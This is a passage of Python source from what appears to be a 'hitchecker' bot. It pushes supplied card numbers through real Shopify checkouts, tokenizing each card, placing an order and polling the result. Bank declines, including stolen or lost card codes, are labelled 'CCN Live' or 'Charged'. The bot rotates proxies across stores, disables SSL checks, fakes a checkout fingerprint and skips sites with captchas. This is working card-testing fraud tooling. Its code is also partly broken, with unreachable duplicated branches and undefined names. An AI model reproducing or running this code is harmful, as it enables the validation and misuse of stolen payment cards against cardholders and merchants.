        if result2 and isinstance(result2, dict) and result2.get('__typename') == 'NegotiationResultAvailable':
            sp2 = result2.get('sellerProposal')
            if sp2 and isinstance(sp2, dict):
                running_total, currency, tax_amount, del_type2, delivery_strategy, shipping_amount, api_pmi2, api_gw2 = _parse_seller(sp2)
                if api_pmi2 and not payment_method_id:
                    payment_method_id = api_pmi2
                if api_gw2:
                    gateway_display_name = api_gw2
    except (KeyError, IndexError, TypeError) as e:
        return None, f"Negotiate error: {str(e)[:50]}", gateway_display_name, None

    # Tokenize card
    await _progress("Tokenizing card...")
    year_full = f"20{yy}" if len(yy) == 2 else yy
    formatted_card = " ".join([cc[i:i+4] for i in range(0, len(cc), 4)])
    token_payload = {
        "credit_card": {
            "month": mm,
            "name": f"{first} {last}",
            "number": formatted_card,
            "verification_value": cvv,
            "year": year_full,
        },
        "payment_session_scope": domain,
    }

    # Extract PCI build hash from checkout page for proper Referer on vault request
    pci_build_match = re.search(r'checkout\.pci\.shopifyinc\.com/build/([a-f0-9]+)/', text)
    pci_referer = f"https://checkout.pci.shopifyinc.com/build/{pci_build_match.group(1)}/" if pci_build_match else checkout_url

    for _vault_attempt in range(2):
        try:
            resp = await session.post('https://deposit.shopifycs.com/sessions', json=token_payload, headers={
                'Content-Type': 'application/json', 'User-Agent': UA,
                'Origin': base_url, 'Referer': pci_referer, 'Accept': 'application/json',
            }, timeout=aiohttp.ClientTimeout(total=8))
            vault_data = await resp.json(content_type=None)
            if 'id' in vault_data:
                payment_token = vault_data['id']
                break
            # Vault rejected - invalid card number
            err_msg = vault_data.get('error', '') or str(vault_data)[:100]
            logger.info(f"[SHOPIFY] Card vault rejected: {err_msg}")
            return None, f"Invalid card - rejected by vault ({err_msg[:50]})", gateway_display_name, None
        except (aiohttp.ClientError, asyncio.TimeoutError, KeyError, TypeError):
            if _vault_attempt == 0:
                await asyncio.sleep(0.5)
                continue
            return None, "Invalid card - vault failed", gateway_display_name, None

    # Submit payment
    try:
        payment_input = {
            'totalAmount': {'any': True},
            'paymentLines': [{
                'paymentMethod': {
                    'directPaymentMethod': {
                        'paymentMethodIdentifier': payment_method_id,
                        'sessionId': payment_token,
                        'billingAddress': {'streetAddress': addr_block},
                        'cardSource': None,
                    },
                },
                'amount': {'value': {'amount': running_total, 'currencyCode': currency}},
                'dueAt': None,
            }],
            'billingAddress': {'streetAddress': addr_block},
        }

        step3_vars = _make_vars()
        step3_vars['delivery'] = _build_selected_delivery()
        step3_vars['payment'] = payment_input

        result3 = await _negotiate(session, graphql_url, headers, step3_vars)
        _update_qt(result3)
        if result3 and isinstance(result3, dict) and result3.get('__typename') == 'NegotiationResultAvailable':
            sp3 = result3.get('sellerProposal')
            if sp3 and isinstance(sp3, dict):
                running_total, currency, tax_amount, _, delivery_strategy, shipping_amount, _, api_gw3 = _parse_seller(sp3)
                if api_gw3:
                    gateway_display_name = api_gw3
                payment_input['paymentLines'][0]['amount']['value']['amount'] = running_total

        if result3 and isinstance(result3, dict) and result3.get('__typename') == 'CheckpointDenied':
            return None, "Checkpoint Denied - Skipping", gateway_display_name, None
    except Exception:
        pass

    # Submit order
    await _progress("Submitting order...")
    submit_delivery = {
        'deliveryLines': [{
            'destination': {'streetAddress': addr_block},
            'selectedDeliveryStrategy': {
                'deliveryStrategyByHandle': {'handle': delivery_strategy, 'customDeliveryRate': False},
                'options': {'phone': phone},
            },
            'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
            'deliveryMethodTypes': ['SHIPPING'],
            'expectedTotalPrice': {'value': {'amount': shipping_amount, 'currencyCode': currency}},
            'destinationChanged': False,
        }],
        'noDeliveryRequired': [], 'useProgressiveRates': True,
        'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True,
    }

    submit_merch = {
        'stableId': stable_id,
        'merchandise': merch_block['merchandise'],
        'quantity': {'items': {'value': 1}},
        'expectedTotalPrice': {'any': True},
        'lineComponentsSource': None, 'lineComponents': [],
    }

    checkout_token = re.search(r'/checkouts/cn/([^/]+)', checkout_url)
    attempt_token = checkout_token.group(1) if checkout_token else checkout_url.split('/')[-1].split('?')[0]

    completion_vars = {
        'input': {
            'sessionInput': {'sessionToken': sst},
            'queueToken': latest_qt[0],
            'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
            'delivery': submit_delivery,
            'merchandise': {'merchandiseLines': [submit_merch]},
            'payment': payment_input,
            'buyerIdentity': {
                'customer': {'presentmentCurrency': currency, 'countryCode': 'US'},
                'email': email, 'emailChanged': False, 'phoneCountryCode': 'US',
                'marketingConsent': [{'email': {'value': email}}],
                'shopPayOptInPhone': {'number': phone, 'countryCode': 'US'},
                'rememberMe': False,
            },
            'tip': {'tipLines': []},
            'taxes': {
                'proposedAllocations': None,
                'proposedTotalAmount': {'value': {'amount': tax_amount, 'currencyCode': currency}},
                'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None,
                'proposedExemptions': [],
            },
            'note': {'message': None, 'customAttributes': []},
            'localizationExtension': {'fields': []},
            'nonNegotiableTerms': {'termsAccepted': True},
            'scriptFingerprint': _generate_script_fingerprint(),
            'optionalDuties': {'buyerRefusesDuties': False},
        },
        'attemptToken': attempt_token,
        'metafields': [],
        'analytics': {'requestUrl': checkout_url},
    }

    async def _do_submit():
        try:
            r = await session.post(graphql_url, json={'query': SUBMIT_QUERY, 'variables': completion_vars, 'operationName': 'SubmitForCompletion'}, headers=headers, timeout=aiohttp.ClientTimeout(total=10))
            return await r.text()
        except (aiohttp.ClientError, asyncio.TimeoutError):
            return '{"error":"submit_timeout"}'

    text = await _do_submit()
    logger.info(f"[SHOPIFY] Submit response: {text[:400]}")

    if "Your order total has changed." in text:
        completion_vars['input']['nonNegotiableTerms'] = {'termsAccepted': True}
        text = await _do_submit()
        if "Your order total has changed." in text:
            return None, "Total changed", gateway_display_name, None
    if "The requested payment method is not available." in text:
        return None, "Payment method unavailable", gateway_display_name, None

    receipt_id = None
    try:
        resp_json = json.loads(text)
        submit_data = resp_json['data']['submitForCompletion']
        typename = submit_data.get('__typename', '')

        if typename == 'SubmitRejected':
            errors = submit_data.get('errors', [])
            codes = [e.get('code', '') for e in errors]
            has_delivery_change = 'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED' in codes
            other_codes = [c for c in codes if c != 'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED']

            if has_delivery_change and not other_codes:
                return None, "Checkpoint Denied - Skipping", gateway_display_name, None
            elif has_delivery_change:
                codes = other_codes

            if typename == 'SubmitRejected':
                if 'CAPTCHA_METADATA_MISSING' in codes or 'CHECKPOINT_DENIED' in codes:
                    return None, "Checkpoint Denied - Skipping", gateway_display_name, None
                msgs = [e.get('localizedMessage', '') for e in errors]
                all_text = ' '.join(codes + msgs).lower()
                if 'terms' in all_text or 'accept' in all_text or 'consent' in all_text:
                    completion_vars['input']['nonNegotiableTerms'] = {'termsAccepted': True}
                    text = await _do_submit()
                    logger.info(f"[SHOPIFY] Submit retry response: {text[:300]}")
                    try:
                        resp_json = json.loads(text)
                        submit_data = resp_json['data']['submitForCompletion']
                        typename = submit_data.get('__typename', '')
                        if typename in ('SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion'):
                            receipt_id = submit_data['receipt']['id']
                        else:
                            return running_total, f"Declined - Terms Required (T&C rejected)", gateway_display_name, None
                    except Exception:
                        return running_total, f"Declined - Terms Required (retry failed)", gateway_display_name, None
                elif codes:
                    # Shopify validation/bot-block codes - NOT bank results
                    technical_codes = ['INVALID_VARIABLE', 'VALIDATION_CUSTOM', 'ARTIFACT_DISSATISFACTION',
                                       'PAYMENTS_PROPOSED_GATEWAY_UNAVAILABLE', 'INPUT_VALIDATION_ERROR']
                    if any(c in technical_codes for c in codes):
                        logger.info(f"[SHOPIFY] Technical rejection (not bank): {', '.join(codes[:2])}")
                        return None, f"Gateway Error - {', '.join(codes[:2])}", gateway_display_name, None
                    return running_total, f"Declined - Rejected: {', '.join(codes[:2])}", gateway_display_name, None

        if typename in ('SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion'):
            receipt_id = submit_data['receipt']['id']
        elif typename == 'SubmitFailed':
            return running_total, f"Declined - Submit failed: {submit_data.get('reason', 'unknown')}", gateway_display_name, None
        elif typename == 'Throttled':
            await asyncio.sleep(2)
            text = await _do_submit()
            resp_json = json.loads(text)
            submit_data = resp_json['data']['submitForCompletion']
            if submit_data.get('__typename') in ('SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion'):
                receipt_id = submit_data['receipt']['id']
            else:
                return None, "Throttled", gateway_display_name, None
        elif typename == 'CheckpointDenied':
            return None, "Checkpoint Denied - Skipping", gateway_display_name, None
    except Exception:
        logger.info(f"[SHOPIFY] Submit parse error. Raw response: {text[:500]}")
        if 'CAPTCHA_METADATA_MISSING' in text:
            return None, "Captcha Solving Failed", gateway_display_name, None
        # Try to parse the actual bank decline from the raw response
        code_in_raw = _extract_between(text, '"code":"', '"') or ''
        msg_in_raw = _extract_between(text, '"localizedMessage":"', '"') or ''
        if code_in_raw:
            return running_total, f"Declined - {code_in_raw}", gateway_display_name, None
        if msg_in_raw:
            return running_total, f"Declined - {msg_in_raw[:80]}", gateway_display_name, None
        return None, f"Declined - Processing error ({subtotal_price})", gateway_display_name, None

    if not receipt_id:
        return None, f"Declined - No receipt ({subtotal_price})", gateway_display_name, None

    # Poll for result
    await _progress("Processing payment...")
    await asyncio.sleep(0.2)

    poll_json = {
        'query': POLL_QUERY,
        'variables': {'receiptId': receipt_id, 'sessionToken': sst},
        'operationName': 'PollForReceipt',
    }

    for poll_i in range(5):
        resp = await session.post(graphql_url, json=poll_json, headers=headers)
        text = await resp.text()
        if 'ProcessingReceipt' not in text and 'WaitingReceipt' not in text:
            break
        await asyncio.sleep(0.5)

    if ('ProcessingReceipt' in text or 'WaitingReceipt' in text):
        await asyncio.sleep(1)
        resp = await session.post(graphql_url, json=poll_json, headers=headers)
        text = await resp.text()
        if ('ProcessingReceipt' in text or 'WaitingReceipt' in text):
            return None, "Processing - Bank still deciding, retry later", gateway_display_name, None

    if 'ActionRequiredReceipt' in text:
        # 3DS verification required = card is LIVE (bank recognized it)
        bank = _parse_bank_response(text)
        return running_total, "CCN Live - 3DS Required", gateway_display_name, {
            'subtotal': subtotal_price, 'shipping': shipping_amount,
            'tax': tax_amount, 'total': running_total, 'currency': currency, 'bank': bank,
        }

    if 'ProcessedReceipt' in text and 'processingError' not in text.lower() and 'FailedReceipt' not in text:
        bank = _parse_bank_response(text)
        return running_total, "Charged", gateway_display_name, {
            'subtotal': subtotal_price,
            'shipping': shipping_amount,
            'tax': tax_amount,
            'total': running_total,
            'currency': currency,
            'bank': bank,
        }

    # Parse bank response code from the poll result
    code = None
    error_message = None
    try:
        resp_json = json.loads(text)
        receipt = resp_json.get('data', {}).get('receipt', {})
        if isinstance(receipt, dict):
            typename = receipt.get('__typename', '')
            if typename == 'FailedReceipt':
                pe = receipt.get('processingError', {})
                if isinstance(pe, dict):
                    code = pe.get('code', '') or ''
                    error_message = pe.get('messageUntranslated', '') or ''
            elif typename == 'ProcessedReceipt':
                # Successfully processed - card charged
                bank = _parse_bank_response(text)
                return running_total, "Charged", gateway_display_name, {
                    'subtotal': subtotal_price, 'shipping': shipping_amount,
                    'tax': tax_amount, 'total': running_total, 'currency': currency, 'bank': bank,
                }
    except Exception:
        pass

    # Fallback: extract code from raw text
    if not code:
        code = _extract_between(text, '{"code":"', '"') or ''
    if not error_message:
        error_message = _extract_between(text, '"messageUntranslated":"', '"') or ''

    bank = _parse_bank_response(text)
    bank_code = bank.get('response_code', '') if bank else ''

    # Combine all available info for keyword matching
    tl = (text + (code or '') + (bank_code or '') + (error_message or '')).lower()

    # Log the actual response for debugging
    logger.info(f"[SHOPIFY] Poll result: code={code} msg={error_message[:100]} bank_code={bank_code}")

    # Only skip if it's a Shopify-specific gateway error (not a bank decline)
    # These are Shopify validation errors, NOT bank responses
    SHOPIFY_GATEWAY_ERRORS = [
        'artifact_dissatisfaction',
        'payments_proposed_gateway_unavailable',
        'captcha_metadata_missing',
        'checkpoint_denied',
        'delivery_delivery_line_detail_changed',
    ]
    if any(k in tl for k in SHOPIFY_GATEWAY_ERRORS):
        return None, f"Gateway Error - {code or error_message or 'Unknown'}", gateway_display_name, None

    # Live decline codes - card is alive but bank declined
    LIVE_DECLINE_KEYWORDS = [
        'insuff', 'funds', 'do_not_honor', 'do not honor', 'generic_decline',
        'card_velocity', 'withdrawal_count', 'try_again_later', 'not_permitted',
        'transaction_not_allowed', 'fraudulent', 'merchant_blacklist',
        'issuer_not_available', 'processing_error', 'approve_with_id',
        'call_issuer', 'security_violation', 'restricted_card',
        'pickup_card', 'lost_card', 'stolen_card',
    ]

    if any(k in tl for k in LIVE_DECLINE_KEYWORDS):
        return running_total, f"CCN Live - {code or bank_code or 'Declined'}", gateway_display_name, {
            'subtotal': subtotal_price, 'shipping': shipping_amount, 'tax': tax_amount,
            'total': running_total, 'currency': currency, 'bank': bank,
        }
    if any(k in tl for k in ['invalid_cvc', 'incorrect_cvc']):
        return running_total, "CCN Live - Invalid CVV", gateway_display_name, {
            'subtotal': subtotal_price, 'shipping': shipping_amount, 'tax': tax_amount,
            'total': running_total, 'currency': currency, 'bank': bank,
        }
    if 'zip' in tl and ('invalid' in tl or 'incorrect' in tl):
        return running_total, "CCN Live - Invalid ZIP", gateway_display_name, {
            'subtotal': subtotal_price, 'shipping': shipping_amount, 'tax': tax_amount,
            'total': running_total, 'currency': currency, 'bank': bank,
        }
    if any(k in tl for k in ['expired', 'card_expired']):
        return running_total, f"Declined - Card Expired", gateway_display_name, {
            'subtotal': subtotal_price, 'shipping': shipping_amount, 'tax': tax_amount,
            'total': running_total, 'currency': currency, 'bank': bank,
        }
    if any(k in tl for k in ['stolen', 'lost', 'pickup']):
        return running_total, f"CCN Live - {code}", gateway_display_name, {
            'subtotal': subtotal_price, 'shipping': shipping_amount, 'tax': tax_amount,
            'total': running_total, 'currency': currency, 'bank': bank,
        }
    if any(k in tl for k in ['do_not_honor', 'generic_decline']):
        return running_total, f"CCN Live - {code}", gateway_display_name, {
            'subtotal': subtotal_price, 'shipping': shipping_amount, 'tax': tax_amount,
            'total': running_total, 'currency': currency, 'bank': bank,
        }
    if code and code.lower() in ('generic_error', 'unknown', ''):
        # Card reached the bank and was declined - this means the card number is VALID
        # A truly dead/invalid card would fail at tokenization, not at the bank
        # So this is a LIVE card that the bank declined for an unknown reason
        return running_total, f"CCN Live - {code or 'Declined by Bank'}", gateway_display_name, {
            'subtotal': subtotal_price, 'shipping': shipping_amount, 'tax': tax_amount,
            'total': running_total, 'currency': currency, 'bank': bank,
        }

    # Any other decline code means the card reached the bank = card is LIVE
    # Only truly invalid cards fail before reaching the bank
    return running_total, f"CCN Live - {code}", gateway_display_name, {
        'subtotal': subtotal_price, 'shipping': shipping_amount, 'tax': tax_amount,
        'total': running_total, 'currency': currency, 'bank': bank,
    }


APPROVED_KEYWORDS = [
    "insufficient", "ccn live", "invalid_cvc", "incorrect_cvc",
    "invalid_cvv", "incorrect_cvv", "incorrect_zip", "insufficient funds",
    "card approved", "transaction approved", "success",
    "do_not_honor", "generic_decline", "cardvelocity", "try_again_later",
    "not_permitted", "transaction_not_allowed", "fraudulent",
    "security_violation", "restricted_card", "pickup_card",
    "lost_card", "stolen_card", "issuer_not_available",
    "processing_error", "approve_with_id", "call_issuer",
]
CHARGED_KEYWORDS = ["thank you", "payment successful", "payment succeeded", "charged"]



def _format_response_v2(raw_resp: dict, status: str = None) -> str:
    """Format shopify native response into clear user message"""
    if not raw_resp:
        return "❌ Error - Empty response"
    
    resp_status = raw_resp.get('status', '')
    response_text = raw_resp.get('response', '')
    amount = raw_resp.get('amount')
    elapsed = raw_resp.get('elapsed', 0)
    resp_lower = response_text.lower()
    
    # Approved/Charged
    if resp_status == 'approved' or (amount and amount != 'N/A'):
        return f"✅ Charged ${amount} - Payment Successful [{elapsed}s]"
    
    # APPROVED - Insufficient Funds means card is GOOD!
    if 'insufficient' in resp_lower or 'funds' in resp_lower:
        return f"✅ APPROVED - Insufficient Funds [{elapsed}s]"
    
    # Dead Site
    if resp_status == 'dead_site' or 'no products' in resp_lower or 'captcha' in resp_lower:
        return f"⚠️ Dead Site - {response_text} [{elapsed}s]"
    
    # Declined - card reached bank but was declined
    if resp_status == 'live' or resp_status == 'declined' or 'decline' in resp_lower:
        if 'do not honor' in resp_lower:
            return f"🟡 Declined - Do Not Honor [{elapsed}s]"
        if 'cvv' in resp_lower or 'cvc' in resp_lower:
            return f"🟡 Declined - Invalid CVV/CVC [{elapsed}s]"
        if 'generic' in resp_lower:
            return f"🟡 Declined - Generic Decline [{elapsed}s]"
        return f"🟡 Declined - Card Declined by Bank [{elapsed}s]"
    
    # Gateway Error
    if resp_status == 'error' or resp_status == 'timeout':
        return f"❌ Error - {response_text} [{elapsed}s]"
    
    # Default
    return f"🟡 Declined - {response_text} [{elapsed}s]"
    
    # Dead Site
    if resp_status == 'dead_site':
        return f"⚠️ Dead Site - {response_text} [{elapsed}s]"
    
    # Declined - show specific reason
    if resp_status == 'live' or resp_status == 'declined' or 'decline' in resp_lower:
        if 'insufficient' in resp_lower or 'funds' in resp_lower:
            return f"🟡 Declined - Insufficient Funds [{elapsed}s]"
        if 'do not honor' in resp_lower:
            return f"🟡 Declined - Do Not Honor [{elapsed}s]"
        if 'cvv' in resp_lower or 'cvc' in resp_lower:
            return f"🟡 Declined - Invalid CVV/CVC [{elapsed}s]"
        if 'generic' in resp_lower:
            return f"🟡 Declined - Generic Decline [{elapsed}s]"
        return f"🟡 Declined - Card Declined by Bank [{elapsed}s]"
    
    # Gateway Error
    if resp_status == 'error' or resp_status == 'timeout':
        return f"❌ Error - {response_text} [{elapsed}s]"
    
    # Default
    return f"🟡 Declined - {response_text} [{elapsed}s]"
    
    # Dead Site (before bank - no products, captcha, etc)
    if resp_status == 'dead_site':
        return f"⚠️ Dead Site - {response_text} [{elapsed}s]"
    
    # CCN Live - ANY decline means it reached the bank!
    if resp_status == 'live' or resp_status == 'declined' or 'decline' in resp_lower:
        if 'insufficient' in resp_lower or 'funds' in resp_lower:
            return f"🟡 CCN Live - Insufficient Funds [{elapsed}s]"
        if 'do not honor' in resp_lower:
            return f"🟡 CCN Live - Do Not Honor [{elapsed}s]"
        if 'cvv' in resp_lower or 'cvc' in resp_lower:
            return f"🟡 CCN Live - Invalid CVV/CVC [{elapsed}s]"
        if 'generic' in resp_lower:
            return f"🟡 CCN Live - Generic Decline [{elapsed}s]"
        return f"🟡 CCN Live - Card Declined by Bank [{elapsed}s]"
    
    # Gateway Error - ONLY timeout/connection errors
    if resp_status == 'error' or resp_status == 'timeout':
        return f"❌ Gateway Error - {response_text} [{elapsed}s]"
    
    # Default - treat as CCN Live (safer)
    return f"🟡 CCN Live - {response_text} [{elapsed}s]"
    
    # Generic decline
    if 'generic_decline' in response_text.lower():
        return f"🟡 CCN Live - Generic Decline [{elapsed}s]"
    
    # Default
    return f"❌ Gateway Error - {response_text} [{elapsed}s]"


def _classify_shopify_response(amount, response, gw_name, site, elapsed, extra=None):
    gateway_name = gw_name or "Shopify Payments"
    clean_site = site.replace("https://", "").replace("http://", "").rstrip("/")
    site_url = f"https://{clean_site}"

    if _is_fake_gateway(gateway_name):
        return {
            "status": "dead_site",
            "response": f"Fake gateway ({gateway_name})",
            "gateway": gateway_name,
            "amount": None,
            "site": site_url,
            "elapsed": elapsed,
            "extra": None,
        }

    resp_lower = (response or "").lower()

    # KEY DISTINCTION:
    # card_declined = Card REACHED BANK (CCN LIVE)
    # generic_decline/error = Card FAILED before bank (GATEWAY ERROR)
    
    is_card_declined = "card_declined" in resp_lower
    is_generic_error = any(k in resp_lower for k in ["generic_decline", "generic error", "processing_error", "error", "failed", "timeout"])
    is_bank_decline = any(k in resp_lower for k in ["insufficient", "ccn live", "invalid_cvc", "incorrect_cvc", "invalid_cvv", "incorrect_cvv", "incorrect_zip", "do_not_honor", "fraud", "velocity"])
    is_3ds = any(k in resp_lower for k in ["3ds", "3d secure", "authentication_required", "requires_action", "action required"])
    is_charged = any(k in resp_lower for k in CHARGED_KEYWORDS)

    if amount is None:
        if is_dead_site:
            status = dead_site
            resp_text = response
        elif is_3ds:
            status = "live"
            resp_text = "3D Secure Required"
        elif is_card_declined:
            status = "approved"
            resp_text = "CCN Live - Card Declined by Bank"
        elif is_bank_decline:
            status = "approved"
            resp_text = response
        elif is_generic_error:
            status = "error"
            resp_text = "Gateway Error - Card Did Not Reach Bank"
        elif is_charged:
            status = "charged"
            resp_text = response
        else:
            status = "error"
            resp_text = response or "Unknown"
        return {
            "status": status,
            "response": resp_text,
            "gateway": gateway_name,
            "amount": None,
            "site": site_url,
            "elapsed": elapsed,
            "extra": extra,
        }

    resp_lower = (response or "").lower()

    if response == "Charged":
        status = "charged"
        resp_text = "Charged"
    elif any(k in resp_lower for k in CHARGED_KEYWORDS):
        status = "charged"
        resp_text = response
    elif any(k in resp_lower for k in ["3ds", "3d secure", "authentication_required", "requires_action", "action required"]):
        status = "live"
        resp_text = response
    elif any(k in resp_lower for k in APPROVED_KEYWORDS):
        status = "approved"
        resp_text = response
    else:
        status = "declined"
        resp_text = response

    return {
        "status": status,
        "response": resp_text,
        "gateway": gateway_name,
        "amount": amount,
        "site": site_url,
        "elapsed": elapsed,
        "extra": extra,
    }


async def shopify_native_check_rich(cc, mm, yy, cvv, site=None, progress_cb=None, proxy=None):
    """Shopify native checker with rich response formatting"""
    import time
    import random
    import aiohttp
    
    start = time.time()
    card_short = f"{cc[:6]}...{cc[-4:]}"
    try:
        with open('/root/hitchecker/bot/proxy.txt', 'r') as f:
            proxy_list = [l.strip() for l in f if l.strip()]
    except:
        proxy_list = []
    _proxy = proxy or (random.choice(proxy_list) if proxy_list else None)
    
    # Single site specified
    if site:
        clean_site = site.replace("https://", "").replace("http://", "").split("/")[0]
        logger.info(f"[SHOPIFY] Card={card_short} Single site mode: {clean_site}, proxy={_proxy is not None}")
        
        try:
            kw = {"timeout": aiohttp.ClientTimeout(total=8), "connector": aiohttp.TCPConnector(limit=100, limit_per_host=30, ttl_dns_cache=600, use_dns_cache=True, ssl=False)}
            if _proxy:
                kw["proxy"] = _proxy
            async with aiohttp.ClientSession(**kw) as session:
                result = await asyncio.wait_for(
                    _shopify_check(session, clean_site, cc, mm, yy, cvv, progress_cb=progress_cb),
                    timeout=10
                )
                amount, response, gw_name = result[0], result[1], result[2]
                extra = result[3] if len(result) > 3 else None
                elapsed = round(time.time() - start, 2)
                
                if _is_skip_response(amount, response):
                    logger.info(f"[SHOPIFY] Card={card_short} Site={clean_site} SKIP: {response} [{elapsed}s]")
                    return {"status": "error", "response": response, "gateway": "Shopify Payments", "amount": None, "site": f"https://{clean_site}", "elapsed": elapsed, "extra": None}
                
                if _is_fake_gateway(gw_name):
                    logger.info(f"[SHOPIFY] Card={card_short} Site={clean_site} SKIP fake gateway: {gw_name}")
                    return {"status": "error", "response": "Fake gateway detected", "gateway": gw_name, "amount": None, "site": f"https://{clean_site}", "elapsed": elapsed, "extra": None}
                
                result_dict = _classify_shopify_response(amount, response, gw_name, clean_site, elapsed, extra)
                logger.info(f"[SHOPIFY] Card={card_short} Site={clean_site} Result={result_dict['status']}/{response} Amount={amount} GW={gw_name} [{elapsed}s]")
                return result_dict
        except (asyncio.TimeoutError, asyncio.CancelledError):
            elapsed = round(time.time() - start, 2)
            logger.info(f"[SHOPIFY] Card={card_short} Site={clean_site} TIMEOUT [{elapsed}s]")
            return {"status": "error", "response": "Timeout", "gateway": "Shopify Payments", "amount": None, "site": f"https://{clean_site}", "elapsed": elapsed, "extra": None}
        except Exception as e:
            elapsed = round(time.time() - start, 2)
            logger.info(f"[SHOPIFY] Card={card_short} Site={clean_site} ERROR: {str(e)[:100]} [{elapsed}s]")
            return {"status": "error", "response": str(e), "gateway": "Shopify Payments", "amount": None, "site": f"https://{clean_site}", "elapsed": elapsed, "extra": None}

    # No specific site: try multiple sites
    sites = SHOPIFY_SITES.copy()
    random.shuffle(sites)
    logger.info(f"[SHOPIFY] Card={card_short} No site specified, trying {min(6, len(sites))} of {len(sites)} sites, proxy={_proxy is not None}")

    for i, s in enumerate(sites[:6]):
        current_proxy = proxy_list[i % len(proxy_list)] if proxy_list else None
        logger.info(f"[SHOPIFY] Card={card_short} Attempt {i+1}/6 site={s} proxy={current_proxy is not None}")

        try:
            kw = {"timeout": aiohttp.ClientTimeout(total=8), "connector": aiohttp.TCPConnector(limit=100, limit_per_host=30, ttl_dns_cache=600, use_dns_cache=True, ssl=False)}
            if current_proxy:
                kw["proxy"] = current_proxy
            async with aiohttp.ClientSession(**kw) as session:
                result = await asyncio.wait_for(
                    _shopify_check(session, s, cc, mm, yy, cvv, progress_cb=progress_cb),
                    timeout=10
                )
                amount, response, gw_name = result[0], result[1], result[2]
                extra = result[3] if len(result) > 3 else None
                elapsed = round(time.time() - start, 2)

                if _is_skip_response(amount, response):
                    logger.info(f"[SHOPIFY] Card={card_short} Site={s} SKIP: {response} [{elapsed}s]")
                    continue

                if _is_fake_gateway(gw_name):
                    logger.info(f"[SHOPIFY] Card={card_short} Site={s} SKIP fake gateway: {gw_name}")
                    continue

                result_dict = _classify_shopify_response(amount, response, gw_name, s, elapsed, extra)
                if result_dict.get("status") == "dead_site":
                    logger.info(f"[SHOPIFY] Card={card_short} Site={s} SKIP dead_site: {result_dict.get('response')}")
                    continue
                logger.info(f"[SHOPIFY] Card={card_short} Site={s} Result={result_dict['status']}/{response} Amount={amount} GW={gw_name} [{elapsed}s]")
                return result_dict
        except (asyncio.TimeoutError, asyncio.CancelledError):
            elapsed = round(time.time() - start, 2)
            logger.info(f"[SHOPIFY] Card={card_short} Site={s} TIMEOUT [{elapsed}s]")
            continue
        except Exception as e:
            elapsed = round(time.time() - start, 2)
            logger.info(f"[SHOPIFY] Card={card_short} Site={s} ERROR: {str(e)[:100]} [{elapsed}s]")
            continue

    elapsed = round(time.time() - start, 2)
    logger.info(f"[SHOPIFY] Card={card_short} ALL SITES FAILED [{elapsed}s]")
    return {"status": "error", "response": "All sites failed", "gateway": "Shopify Payments", "amount": None, "site": None, "elapsed": elapsed, "extra": None}
